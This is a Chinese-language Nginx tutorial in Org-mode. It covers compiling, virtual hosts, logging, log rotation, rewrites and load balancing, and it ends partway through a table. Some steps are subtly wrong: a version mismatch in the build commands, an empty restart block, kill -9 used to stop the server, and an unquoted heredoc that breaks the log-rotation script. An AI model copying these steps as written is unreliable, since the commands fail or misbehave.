   Nginx使用epoll(Linux 2.6内核)和kqueue(FreeBSD)网络I/O模型，而Apache
   则使用的是传统的select模型。目前Linux下能够承受高并发访问的Squid、
   Memcached都采用的是epoll网络I/O模型。

   下面用一个比喻来解释Apache采用的select模型和Nginx采用的epoll模型之
   间的区别：
   #+BEGIN_EXAMPLE
   假设你在大学读书，住的宿舍楼有很多房间，你的朋友要来找你。select版
   宿管大妈就会带着你的朋友挨个房间去找，直到找到你的朋友为止。而epoll
   版宿管大妈会先记下每位同学的房间号，你的朋友来时，只需要告诉你的朋
   友住在哪个房间即可，不用亲自带着你的朋友满宿舍找人。如果来了10000个
   人，都要找自己住这栋楼的同学时，select版和epoll版宿管大妈，谁的效率
   高，大家应该清楚了。同理，在高并发服务器中，轮询I/O是最耗时间的操作
   之一，select和epoll的性能谁的性能更高，同样十分明了。
   #+END_EXAMPLE
   
   |              | select                                     | epoll                                                  |
   |--------------+--------------------------------------------+--------------------------------------------------------|
   | 性能         | 随着连接数增加，急剧下降。处理成千上万并发 | 随着连接数的增加，性能基本上没有下降。处理成千上万并发 |
   |              | 连接数时，性能很差                         | 连接时，性能很好                                       |
   |--------------+--------------------------------------------+--------------------------------------------------------|
   | 连接数       | 连接数有限制，处理的最大连接数不超过1024。 | 连接数无限制                                           |
   |              | 如果超过1024个连接数，则需要修改FD_SETSIZE |                                                        |
   |              | 宏，并重新编译                             |                                                        |
   |--------------+--------------------------------------------+--------------------------------------------------------|
   | 内在处理机制 | 线性轮询                                   | 回调callback                                           |
   |--------------+--------------------------------------------+--------------------------------------------------------|
   | 开发复杂性   | 低                                         | 中                                                     |
** 如何正确选择WEB服务器
   在实际工作中，我们要根据业务需求来选择合适的业务服务器，在满足需求
   的前提下，可以选择自己最擅长的软件，然后掌握了新的软件后，在逐步替
   换，切记不要盲从选择使用，最终导致自己无法控制的结果。
   #+BEGIN_EXAMPLE
   静态业务：采用Nginx或Lighttpd
   动态业务：采用Nginx和Apache均可
   动态业务可以由前端代理，根据页面元素的类型，向后转发相应的服务器进行处理。
   如果并发不是很大，又对Apache很熟悉，采用Apache也是可以的，Apache2.4版本也
   很强大，并发连接数也有所增加。
   #+END_EXAMPLE
** 编译安装
   需要下载其依赖包，pcre及zlib
   1. pcre
	  #+BEGIN_EXAMPLE
	  pcre(Perl Compatible Regular Expressions)
	  该模块实现Nginx的正则表达式
	  #+END_EXAMPLE
   2. zlib-devel
	  #+BEGIN_EXAMPLE
	  该模块实现Nginx的HttpGzip压缩功能
	  #+END_EXAMPLE
   3. openssl-devel
	  #+BEGIN_EXAMPLE
	  如果有需要则安装
	  #+END_EXAMPLE

   编译安装：
   #+BEGIN_SRC bash
# cd /usr/local/src
# wget http://nginx.org/download/nginx-1.9.11.tar.gz
# wget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.37.tar.bz2
# cd /usr/local/src/nginx-1.8.0
# useradd -s /sbin/nologin -M nginx
# ./configure --prefix=/usr/local/nginx-1.9.11 \
--user=nginx --group=nginx \
--with-http_stub_status_module \
--with-file-aio \
--with-http_dav_module \
--with-http_ssl_module \
--with-pcre=/usr/local/src/pcre-8.37
# make
# make install   
   #+END_SRC

   #+BEGIN_EXAMPLE
   ln -s /usr/local/nginx-1.9.11 /usr/local/nginx
   方便以后升级。
   # 当Nginx软件升级带新版本后，删除原来软链接在重新建立新的到/usr/local/nginx就好
   # 程序中如果有引用Nginx路径的地方，不需要做任何更改，因为升级后访问路径还是
   # /usr/local/nginx
   #+END_EXAMPLE
** 基本使用
*** Nginx命令行参数
	Nginx支持下面的一些命令行参数：
    |----------+----------+----------------------------------------------------------------------------|
    | 选项     | 参数     | 说明                                                                       |
    |----------+----------+----------------------------------------------------------------------------|
    | -? or -h | -        | 显示帮助信息                                                               |
    |----------+----------+----------------------------------------------------------------------------|
    | -c       | 配置文件 | 使用指定的配置文件而非默认的配置文件                                       |
    |----------+----------+----------------------------------------------------------------------------|
    | -g       | 指令     | 使用命令行进行全局配置，                                                   |
    |          |          | 如nginx -g "pid /var/run/nginx.pid; worker_processes `sysctl -n hw.ncpu`;" |
    |----------+----------+----------------------------------------------------------------------------|
    | -p       | prefix   | set nginx path prefix, a directory that will keep server files             |
    |----------+----------+----------------------------------------------------------------------------|
    | -q       |          | 进行配置语法检查时，不输出非错误信息                                       |
    |----------+----------+----------------------------------------------------------------------------|
    | -s       | signal   | 向Nginx主进程发送指定signal                                                |
    |          | stop     | 快速关闭                                                                   |
    |          | quit     | 优雅地关闭                                                                 |
    |          | reload   | 重新读取配置文件，使用新的配置启动新的工作进程，优雅地关闭旧的工作进程     |
    |          | reopen   | 重新打开日志文件                                                           |
    |----------+----------+----------------------------------------------------------------------------|
    | -t       |          | 配置语法检查                                                               |
    |----------+----------+----------------------------------------------------------------------------|
    | -T       |          | 与-t相同，但会把配置信息打印到标准输出                                     |
    |----------+----------+----------------------------------------------------------------------------|
    | -v       |          | 打印Nginx版本信息                                                          |
    |----------+----------+----------------------------------------------------------------------------|
    | -V       |          | 打印Nginx版本信息，编译信息和配置参数                                      |
    |----------+----------+----------------------------------------------------------------------------|

*** 启停
	启动：
	#+BEGIN_SRC bash
	# /usr/local/nginx/sbin/nginx
	#+END_SRC

	停止：
	#+BEGIN_SRC bash
	# kill -9 <nginx_pid>
	#+END_SRC

	重启：
	#+BEGIN_SRC bash
	
	#+END_SRC
*** 显示编译信息
	#+BEGIN_SRC bash
	# /usr/local/nginx/sbin/nginx -V
	nginx version: nginx/1.8.0
	built by gcc 4.4.7 20120313 (Red Hat 4.4.7-16) (GCC) 
	configure arguments: --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_gzip_static_module
	#+END_SRC
** Nginx配置说明
*** nginx.conf主配置文件说明
    #+BEGIN_EXAMPLE
worker_processes  1; # worker进程的数量

events { # 事件标签
    worker_connections  1024; # 每个worker进程支持的最大连接数
}

http {
    include            mime.types; # Nginx支持的媒体类型库文件
    default_type       application/octet-stream; # 默认的媒体类型
    sendfile           on; # 开启高效传输模式
    keepalive_timeout  65; # 连接超时
    
    server {               # 第一个server标签，表示一个独立的虚拟主机站点
        listen       80;   # 提供服务外的端口，默认80
        server_name  www.lavenliu.com; # 提供服务的域名，主机名
        
        location / { # 第一个location标签开始
            root   html/www; # 站点的根目录，相当于Nginx安装目录
            index  index.html index.htm; # 默认的首页文件，多个用空格分开
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }
    
    server {
        listen       80;
        server_name  bbs.lavenliu.com;
        
        location / {
            root   html/bbs;
            index  index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }

    server {
        listen       80;
        server_name  blog.lavenliu.com;
        
        location / {
            root   html/blog;
            index  index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }
}
    #+END_EXAMPLE
** Nginx虚拟主机配置
   一个server标签就是一个虚拟主机。
   1. 基于域名的虚拟主机。通过域名来区分虚拟主机 -> 应用：外部网站
   2. 基于端口的虚拟主机。通过端口来区分虚拟主机 -> 应用：公司内部网站，网站的后台
   3. 基于IP的虚拟主机。几乎不用。不支持ifconfig别名配置
*** 基于域名的虚拟主机访问原理
   #+BEGIN_EXAMPLE
worker_processes  1; # worker进程的数量

events { # 事件标签
    worker_connections  1024; # 每个worker进程支持的最大连接数
}

http {
    include            mime.types; # Nginx支持的媒体类型库文件
    default_type       application/octet-stream; # 默认的媒体类型
    sendfile           on; # 开启高效传输模式
    keepalive_timeout  65; # 连接超时
    
    server {               # 第一个server标签，表示一个独立的虚拟主机站点
        listen       80;   # 提供服务外的端口，默认80
        server_name  www.lavenliu.com; # 提供服务的域名，主机名
        
        location / { # 第一个location标签开始
            root   html/www; # 站点的根目录，相当于Nginx安装目录
            index  index.html index.htm; # 默认的首页文件，多个用空格分开
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }
    
    server {
        listen       80;
        server_name  bbs.lavenliu.com;
        
        location / {
            root   html/bbs;
            index  index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }

    server {
        listen       80;
        server_name  blog.lavenliu.com;
        
        location / {
            root   html/blog;
            index  index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }
}   
   #+END_EXAMPLE

   当配置多个虚拟主机时，如果通过IP地址来访问的话，那么将访问到配置文
   件里的第一个定义的虚拟主机。最主要的原因是http的请求头里没有包含
   "Host: xxx.yyyy.com"字段，所以，网站返回了第一个配置的虚拟主机。
*** 基于端口的虚拟主机
   #+BEGIN_EXAMPLE
worker_processes  1; # worker进程的数量

events { # 事件标签
    worker_connections  1024; # 每个worker进程支持的最大连接数
}

http {
    include            mime.types; # Nginx支持的媒体类型库文件
    default_type       application/octet-stream; # 默认的媒体类型
    sendfile           on; # 开启高效传输模式
    keepalive_timeout  65; # 连接超时
    
    server {               # 第一个server标签，表示一个独立的虚拟主机站点
        listen       81;   # 提供服务外的端口，默认80
        server_name  www.lavenliu.com; # 提供服务的域名，主机名
        
        location / { # 第一个location标签开始
            root   html/www; # 站点的根目录，相当于Nginx安装目录
            index  index.html index.htm; # 默认的首页文件，多个用空格分开
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }
    
    server {
        listen       82;
        server_name  www.lavenliu.com;
        
        location / {
            root   html/bbs;
            index  index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }

    server {
        listen       83;
        server_name  www.lavenliu.com;
        
        location / {
            root   html/blog;
            index  index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }
}
   #+END_EXAMPLE
*** 基于IP的虚拟主机
   使用ip命令在eth1上再增加一个辅助IP，
   #+BEGIN_SRC sh
ip addr add 192.168.20.119/24 dev eth1
ping 192.168.20.119
   #+END_SRC

   配置文件，
   #+BEGIN_EXAMPLE
worker_processes  1; # worker进程的数量

events { # 事件标签
    worker_connections  1024; # 每个worker进程支持的最大连接数
}

http {
    include            mime.types; # Nginx支持的媒体类型库文件
    default_type       application/octet-stream; # 默认的媒体类型
    sendfile           on; # 开启高效传输模式
    keepalive_timeout  65; # 连接超时
    
    server {               # 第一个server标签，表示一个独立的虚拟主机站点
        listen       192.168.20.118:80;   # 提供服务外的端口，默认80
        server_name  www.lavenliu.com; # 提供服务的域名，主机名
        
        location / { # 第一个location标签开始
            root   html/www; # 站点的根目录，相当于Nginx安装目录
            index  index.html index.htm; # 默认的首页文件，多个用空格分开
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }
    
    server {
        listen       192.168.20.119:80;
        server_name  www.lavenliu.com;
        
        location / {
            root   html/bbs;
            index  index.html index.htm;
        }
        error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
        location = /50x.html {
            root   html; # 指定对应的站点目录为html
        }
    }
}
   #+END_EXAMPLE

   测试，
   #+BEGIN_SRC sh
[root@lnmp conf]# curl 192.168.20.119
bbs.lavenliu.com
[root@lnmp conf]# curl 192.168.20.118
www.lavenliu.com
   #+END_SRC
** 利用include功能优化Nginx配置文件
   为了保持nginx.conf配置文件的清晰，可以使用include指令把额外的配置放
   到单独的配置文件里，然后使用include把该文件包含进来即可。相当于
   apache下的"include vhosts/*.conf"

   #+BEGIN_SRC sh
cd /application/nginx/conf
cat > nginx.conf <<EOF
worker_processes  1; # worker进程的数量

events { # 事件标签
    worker_connections  1024; # 每个worker进程支持的最大连接数
}

http {
    include            mime.types; # Nginx支持的媒体类型库文件
    default_type       application/octet-stream; # 默认的媒体类型
    sendfile           on; # 开启高效传输模式
    keepalive_timeout  65; # 连接超时

    include extra/www.conf; # 或者可以写成 include extra/*.conf;
    include extra/bbs.conf;
    include extra/blog.conf;
}
EOF
mkdir extra
cd extra
cat > www.conf <<EOF
server {               # 第一个server标签，表示一个独立的虚拟主机站点
    listen       192.168.20.118:80;   # 提供服务外的端口，默认80
    server_name  www.lavenliu.com; # 提供服务的域名，主机名
    
    location / { # 第一个location标签开始
        root   html/www; # 站点的根目录，相当于Nginx安装目录
        index  index.html index.htm; # 默认的首页文件，多个用空格分开
    }
    error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
    location = /50x.html {
        root   html; # 指定对应的站点目录为html
    }
}
EOF

cat > bbs.conf <<EOF
server {               # 第一个server标签，表示一个独立的虚拟主机站点
    listen       80;   # 提供服务外的端口，默认80
    server_name  bbs.lavenliu.com; # 提供服务的域名，主机名
    
    location / { # 第一个location标签开始
        root   html/bbs; # 站点的根目录，相当于Nginx安装目录
        index  index.html index.htm; # 默认的首页文件，多个用空格分开
    }
    error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
    location = /50x.html {
        root   html; # 指定对应的站点目录为html
    }
}

EOF

cat > blog.conf <<EOF
server {               # 第一个server标签，表示一个独立的虚拟主机站点
    listen       80;   # 提供服务外的端口，默认80
    server_name  blog.lavenliu.com; # 提供服务的域名，主机名
    
    location / { # 第一个location标签开始
        root   html/blog; # 站点的根目录，相当于Nginx安装目录
        index  index.html index.htm; # 默认的首页文件，多个用空格分开
    }
    error_page   500 502 503 504  /50x.html; # 出现50x错误代码时，使用50x.html响应
    location = /50x.html {
        root   html; # 指定对应的站点目录为html
    }
}
EOF
   #+END_SRC
** Nginx别名作用及配置实战-企业应用案例
   所谓虚拟主机别名，就是为虚拟主机设置除了主域名以外的一个或多个名称。

   在server标签内的server_name指令后面可以写多个，每个用空格分开。每个
   域名都要有DNS解析才行。第一个就是主域名，后面的就是这个主域名的别名。
** Nginx状态信息配置实战及信息详解
   在编译Nginx时，我们编译了"stub_status_module"模块，这个模块可以让我
   们查看Nginx的当前运行状态。

   #+BEGIN_SRC sh
cat > /application/nginx/conf/extra/status.conf <<EOF
server {
    listen 80;
    server_name status.lavenliu.com;
    location / {
        stub_status on;
        access_log  off;
    }
}
EOF
   #+END_SRC

   #+BEGIN_EXAMPLE
   Active connections: 2000 # 表示正在处理的活动连接数2872个
   server accepts handled requests
   xxxxxx yyyyyy zzzzzz
   Reading:80 Writing:35 Waiting:2757
   server：表示Nginx启动到现在共处理了xxxxxx连接
   accepts：表示Nginx启动到现在共成功创建yyyyyy此握手
            请求丢失数=(握手数-连接数)，可以看出，本次状态显示没有丢失请求
   handled requests：表示总共处理了zzzzzz此请求
   Reading：Nginx读取到客户端的Header信息数
   Writing：Nginx返回给客户端的Header信息数
   Waiting：Nginx已经处理完正在等待下一次请求指令的驻留连接，开启keep-alive的情况下，
            这个值等于active-(reading+writing)
   #+END_EXAMPLE
** Nginx错误日志作用及配置
   Nginx的错误信息是调试Nginx服务的重要手段，属于核心功能模块
   （ngx_core_module）的指令，该指令名字为"error_log"，可以放在main标
   签中做全局配置，也可以放置在不同的主机中单独记录虚拟主机的错误信息。

   error_log的语法格式及参数语法说明如下：
   #+BEGIN_EXAMPLE
   error_log file     level;
   关键字    日志文件 错误日志级别
   #+END_EXAMPLE

   常见的有[debug|info|notice|warn|error|crit|alert|emerg]，级别越高记
   录的信息越少，场景一般是warn|error|crit这个三个级别之一，注意不要配
   置info等较低级别，会带来大量磁盘I/O消耗。

   可以放置的标签为：
   #+BEGIN_EXAMPLE
   main http server location
   #+END_EXAMPLE
*** 错误日志配置
	在配置文件中添加如下内容，
	#+BEGIN_SRC sh
error_log logs/error.log error;
	#+END_SRC

	检查配置语法，并reload服务
	#+BEGIN_SRC sh
/application/nginx/sbin/nginx -t
/application/nginx/sbin/nginx -s reload
	#+END_SRC
** 访问日志作用及格式详解并配置
   Nginx软件会把每个用户访问网站的日志信息记录到指定的日志文件里，供网
   站提供分析用户浏览行为等，此功能由ngx_http_log_module模块负责。
*** 访问日志参数
	Nginx的访问日志参数主要由下表的两个参数控制，
    | 参数       | 说明                                                           |
    |------------+----------------------------------------------------------------|
    | log_format | 用来定义记录日志的格式（可以定义多种日志格式，去不同名字即可） |
    | access_log | 用来指定日志文件的路径及使用的何种日志格式记录日志             |
*** 配置访问日志及采集日志对日志格式详解
	#+BEGIN_EXAMPLE
    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
			          '"$http_user_agent" "$http_x_forwarded_for"';
	#+END_EXAMPLE

	main是为日志格式指定的标签，记录日志时通过这个main标签选择指定的格
	式。其后所接的所有内容都是可以记录的日志信息，具体见下表，所有的日
	志段用空格分隔，一行可以记录多个。
    | Nginx日志变量         | 说明                                                                                |
    |-----------------------+-------------------------------------------------------------------------------------|
    | $remote_addr          | 记录访问网站的客户端地址                                                            |
    | $http_x_forwarded_for | 当前端有代理服务器时，设置web节点记录客户端地址的配置，此参数生效的前提是代理服务器 |
    |                       | 上也要进行相关的x_forwarded_for设置                                                 |
    | $remote_user          | 远程客户端用户名称                                                                  |
    | $time_local           | 记录访问时间与时区                                                                  |
    | $request              | 用户的http请求起始行信息                                                            |
    | $status               | http状态码，记录请求返回的状态，例如：200、404、301等                               |
    | $body_bytes_sent      | 服务器发送给客户端的响应body字节数                                                  |
    | $http_referer         | 记录此请求是从哪个廉洁访问过来的，可以根据referer进行防盗链设置                     |
    | $http_user_agent      | 记录客户端访问信息，例如，浏览器、手机客户端等                                      | 

	没有特殊要求，默认的配置即可，更多的设置可以参考记录日志信息的变量，
	#+BEGIN_EXAMPLE
	http://nginx.org/en/docs/http/ngx_http_log_module.html
	#+END_EXAMPLE
*** 配置实战
	配置语法，
	#+BEGIN_EXAMPLE
	access_log logs/access.log main;
	#+END_EXAMPLE

	访问日志最好是基于虚拟主机。这里以www虚拟主机为例进行配置，
	#+BEGIN_SRC sh
[root@lnmp conf]# cat extra/www.conf 
server {               # 第一个server标签，表示一个独立的虚拟主机站点
    listen       80;   # 提供服务外的端口，默认80
    server_name  www.lavenliu.com; # 提供服务的域名，主机名
    
    location / { # 第一个location标签开始
        root   html/www; # 站点的根目录，相当于Nginx安装目录
        index  index.html index.htm; # 默认的首页文件，多个用空格分开
    }
    access_log logs/access_www.log main;
}
	#+END_SRC
** 访问日志优化及企业工作日志轮询案例
   默认情况下，Nginx会把所有的访问日志生成到一个指定的访问日志文件
   access.log里，时间长了会导致日志文件很大，不利于分析日志和处理，因
   此，有必要对Nginx日志按天或按小时进行切割成不同的文件保留，这里使用
   按天切割的方法。

   具体切割脚本如下：
   #+BEGIN_SRC sh
cat > /server/scripts/cut_nginx_log.sh <<EOF
#!/bin/bash
DATE_FORMAT=`date +%Y%m%d`
BASE_DIR="/application/nginx"
NGX_LOG_DIR="$BASE_DIR/logs"
LOG_NAME="access_www"
[ -d $NGX_LOG_DIR ] && cd $NGX_LOG_DIR || exit 1
[ -f ${LOG_NAME}.log ] || exit 1
/bin/mv ${LOG_NAME}.log ${DATE_FORMAT}_${LOG_NAME}.log
$BASE_DIR/sbin/nginx -s reload # 重新生成日志
EOF
   #+END_SRC

   设置定时任务实现每天00点整定时执行/server/scripts/cut_nginx_log.sh
   切割日志：
   #+BEGIN_SRC sh
cat >> /var/spool/cron/root <<EOF
### cut nginx access log by lavenliu
00 00 * * * /bin/sh /server/scripts/cut_nginx_log.sh &> /dev/null 
EOF
[root@lnmp conf]# crontab -l
### cut nginx access log by lavenliu
00 00 * * * /bin/sh /server/scripts/cut_nginx_log.sh &> /dev/null
   #+END_SRC
** Nginx rewrite语法介绍及301跳转企业实战案例配置
   #+BEGIN_SRC sh
[root@lnmp conf]# cat extra/www.conf 
server {
    listen       80;
    server_name  lavenliu.com;
    rewrite ^/(.*) http://www.lavenliu.com/$1 permanent;
}

server {               # 第一个server标签，表示一个独立的虚拟主机站点
    listen       80;   # 提供服务外的端口，默认80
    server_name  www.lavenliu.com; # 提供服务的域名，主机名
    
    location / { # 第一个location标签开始
        root   html/www; # 站点的根目录，相当于Nginx安装目录
        index  index.html index.htm; # 默认的首页文件，多个用空格分开
    }
    access_log logs/access_www.log main;
}
   #+END_SRC
   
   重新加载配置，
   #+BEGIN_SRC sh
[root@lnmp conf]# ../sbin/nginx -t
nginx: the configuration file /application/nginx-1.6.3/conf/nginx.conf syntax is ok
nginx: configuration file /application/nginx-1.6.3/conf/nginx.conf test is successful
[root@lnmp conf]# ../sbin/nginx -s reload
[root@lnmp conf]# curl -I lavenliu.com
HTTP/1.1 301 Moved Permanently
Server: nginx/1.6.3
Date: Thu, 10 Mar 2016 02:32:56 GMT
Content-Type: text/html
Content-Length: 184
Connection: keep-alive
Location: http://www.lavenliu.com/
   #+END_SRC

   访问流程：
   1. lavenliu.com/index.html
   2. tcp 192.168.20.118 80
   3. get /index.html http 1.1
   4. nginx找nginx.conf -> include -> www.conf
   5. 客户端的请求头里包含"lavenliu.com"，根据配置重定向到www.lavenliu.com
** Nginx rewrite语法细节及正则介绍
   指令语法：rewrite regex replacement [flag];
   默认值：none
   应用位置：server, location, if

   rewrite是实现URL重写的关键指令，根据regex（正则表达式）部分内容，重
   定向到replacement部分内容，结尾是flag标记。下面是一个简单的URL
   Rewrite跳转的例子，
   #+BEGIN_EXAMPLE
   rewrite ^/(.*) http://www.lavenliu.com/$1 permanent;
   #+END_EXAMPLE
   
   rewrite指令最后一项参数为flag标记，rewrite支持的flag标记见下表，
   | flag标记符号 | 说明                                                 |
   |--------------+------------------------------------------------------|
   | last         | 本条规则匹配完成后，继续向下匹配新的location URI规则 |
   | break        | 本条规则匹配完成即终止。不再匹配后面的任何规则       |
   | redirect     | 返回302临时重定向，浏览器地址栏会显示跳转后的URL地址 |
   | permanent    | 返回301永久重定向，浏览器地址栏会显示跳转后的URL地址 |
** Nginx rewrite企业应用场景详解
   Nginx的rewrite功能在企业里应用非常广泛：
   1. 可以调整用户浏览的URL，看起来更规范，合乎开发及产品人员的需求。
   2. 为了让搜索引擎收录网站内容及用户体验更好，企业会将动态URL地址伪
      装成静态地址提供服务。
   3. 网站换新域名后，让旧域名的访问跳转到新的域名上，例如：让京东的360buy.com
   4. 根据特殊变量、目录、客户端的信息进行URL跳转等。

   如访问www.360buy.com时，
   #+BEGIN_SRC sh
[root@lnmp conf]# curl -I 360buy.com
HTTP/1.1 302 Moved Temporarily
Server: JDWS/1.0.0
Date: Thu, 10 Mar 2016 02:47:36 GMT
Content-Type: text/html
Content-Length: 159
Location: http://m.jd.com/
Connection: Keep-alive

[root@lnmp conf]# curl -I www.360buy.com
HTTP/1.1 301 Moved Permanently
Server: JDWS
Date: Thu, 10 Mar 2016 02:03:59 GMT
Content-Type: text/html
Content-Length: 272
Location: http://www.jd.com/
Via: BJ-H-NX-112(), http/1.1 SQ-UNI-1-JCS-167 ( [cRs f ])
Age: 2634
Connection: keep-alive
   #+END_SRC
** 利用Nginx rewrite规则实现不同域名URL跳转的案例
   实现访问http://blog.lavenliu.com跳转到
   http://www.lavenliu.com/blog/lavenliu.html。外部跳转时使用这种方法，
   浏览器地址会变为跳转后的地址，另外，要实现设置
   http://www.lavenliu.com/blog/lavenliu.html 有输出结果，不然会出现
   401等权限错误。
   
   配置Nginx rewrite规则，跳转前http://blog.lavenliu.com对应站点的配置如下，
   #+BEGIN_SRC sh
[root@lnmp conf]# cat extra/blog.conf 
server {               # 第一个server标签，表示一个独立的虚拟主机站点
    listen       80;   # 提供服务外的端口，默认80
    server_name  blog.lavenliu.com; # 提供服务的域名，主机名
    
    location / { # 第一个location标签开始
        root   html/blog; # 站点的根目录，相当于Nginx安装目录
        index  index.html index.htm; # 默认的首页文件，多个用空格分开
    }
	
	if ( $http_host ~* "^(.*)\.lavenliu\.com$" ) {
		set $domain $1;
		rewrite ^(.*) http://www.lavenliu.com/$domain/lavenliu.html break;
	}
}
   #+END_SRC

   测试，
   #+BEGIN_SRC sh
[root@lnmp conf]# ../sbin/nginx -t
nginx: the configuration file /application/nginx-1.6.3/conf/nginx.conf syntax is ok
nginx: configuration file /application/nginx-1.6.3/conf/nginx.conf test is successful
[root@lnmp conf]# ../sbin/nginx -s reload
[root@lnmp conf]# curl -I blog.lavenliu.com
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.6.3
Date: Thu, 10 Mar 2016 03:16:57 GMT
Content-Type: text/html
Content-Length: 160
Connection: keep-alive
Location: http://www.lavenliu.com/blog/lavenliu.html
   #+END_SRC
** Nginx进程及运行时控制
*** Master & Worker进程
   	NGINX has one master process and one or more worker processes. If
   	caching is enabled, the cache loader and cache manager processes
   	also run at startup.

   	The main purpose of the master process is to read and evaluate
   	configuration files, as well as maintain the worker processes.

   	The worker processes do the actual processing of requests. NGINX
   	relies on OS-dependent mechanisms to efficiently distribute
   	requests among worker processes. The number of worker processes is
   	defined in the nginx.conf configuration file and can be fixed for a
   	given configuration or automatically adjusted to the number of
   	available CPU cores.

   	小白的翻译：
   	#+BEGIN_EXAMPLE
   	Nginx有一个主进程和一个或多个工作进程。如果开
   	启缓存功能，缓存的loader与manager进程也会随着Nginx主进程一起启动。

   	主进程的主要作用是读取并评估配置文件，同时也管理工作进程。

   	实际的处理请求工作由Nginx的工作进程来完成。Nginx主要依赖操作系统的
   	一些机制在工作进程中高效的分发请求。Nginx的工作进程数量可以在
   	nginx.conf主配置文件中进行指定或根据CPU可用的核心数进行自动的调整。
   	#+END_EXAMPLE
*** 控制Nginx
	当修改完毕Nginx的配置文件后，我们可以停止或重启Nginx进程，或者向
	Nginx的主进程发送具体的信号。信号可以通过运行nginx命令并跟上"-s"选
	项来发送到Nginx主进程。
	#+BEGIN_EXAMPLE
	# /path/to/nginx -s <signal>
	#+END_EXAMPLE

	信号可以是下面的任何一个：
	+ quit   - 优雅地关闭(工作进程处理完当前的请求后退出)
	+ reload - 重新加载配置文件
	+ reopen - 重新打开日志文件
	+ stop   - 立即关闭(快速关闭)
** 配置文件中的度量单位
   Sizes can be specified in bytes, kilobytes (suffixes k and K) or
   megabytes (suffixes m and M), for example, "1024", "8k", "1m".

   Time intervals can be specified in milliseconds, seconds, minutes,
   hours, days and so on, using the following suffixes:
   | 单位 | 说明            |
   |------+-----------------|
   | ms   | milliseconds    |
   | s    | seconds         |
   | m    | minutes         |
   | h    | hours           |
   | d    | days            |
   | w    | weeks           |
   | M    | months, 30 days |
   | y    | years, 365 days | 

   Multiple units can be combined in a single value by specifying them
   in the order from the most to the least significant, and optionally
   separated by whitespace. For example, "1h 30m" specifies the same
   time as "90m" or "5400s". A value without a suffix means
   seconds. It is recommended to always specify a suffix.

   Some of the time intervals can be specified only with a seconds
   resolution.
** Nginx处理连接请求所使用的方法
   nginx supports a variety of connection processing methods. The
   availability of a particular method depends on the platform
   used. On platforms that support several methods nginx will normally
   select the most efficient method automatically. However, if needed,
   a connection processing method can be selected explicitly with the
   use directive.小白的翻译：Nginx支持多种处理客户端连接请求的方法。每
   种处理方法都依赖特定的操作系统。如果在某种操作系统上Nginx支持多种处
   理连接请求的方法，则Nginx会自动选用这些方法中相对高效的处理方法。或
   者，我们也可使用use指令进行手工指定某种特定的方法。

   Nginx支持以下的处理连接请求的方法：
   1. select    - 标准方法
	  #+BEGIN_EXAMPLE
	  standard method. The supporting module is built automatically on
      platforms that lack more efficient methods. The
      --with-select_module and --without-select_module configuration
      parameters can be used to forcibly enable or disable the build
      of this module.
	  #+END_EXAMPLE
   2. poll      - 标准方法
	  #+BEGIN_EXAMPLE
	  The supporting module is built automatically on platforms that
      lack more efficient methods. The --with-poll_module and
      --without-poll_module configuration parameters can be used to
      forcibly enable or disable the build of this module.
	  #+END_EXAMPLE
   3. kqueue    - 高效方法
	  #+BEGIN_EXAMPLE
	  FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0, and Mac OS X.
	  #+END_EXAMPLE
   4. epoll     - 高效方法
	  #+BEGIN_EXAMPLE
	  Linux 2.6+
	  #+END_EXAMPLE
   5. /dev/poll - 高效方法
	  #+BEGIN_EXAMPLE
	  Solaris 7 HP/UX 11.22+ IRIX 6.5.15+ Tru64 UNIX 5.1A+
	  #+END_EXAMPLE
   6. eventport - 高效方法
	  #+BEGIN_EXAMPLE
	  Solaris 10
	  #+END_EXAMPLE
** 使用Nginx作为HTTP的负载均衡器
*** 简介
	Load balancing across multiple application instances is a commonly
	used technique for optimizing resource utilization, maximizing
	throughput, reducing latency, and ensuring fault-tolerant
	configurations.

	It is possible to use nginx as a very efficient HTTP load balancer
	to distribute traffic to several application servers and to
	improve performance, scalability and reliability of web
	applications with nginx.
*** upstream模块
	Nginx的负载均衡功能依赖于ngx_upstream_module模块。所支持的代理方式有，
    1. proxy_pass
    2. fastcgi_pass
    3. memcached_pass
    
	upstream模块相关说明：
	1. upstream字段放置在nginx.conf的http{}标签内，与server字段平行。
	2. upstream模块默认的算法是wrr（权重轮询weighted round-robin）
	
	upstream内部指令部分说明：
    | 指令                  | 说明                                                                 |
    |-----------------------+----------------------------------------------------------------------|
    | server 192.168.20.128 | 负载均衡后面的RS配置，可以是IP或域名，端口默认为80，可省略不写。     |
    |                       | 高并发场景IP要换成域名，通过DNS做负载均衡。                          |
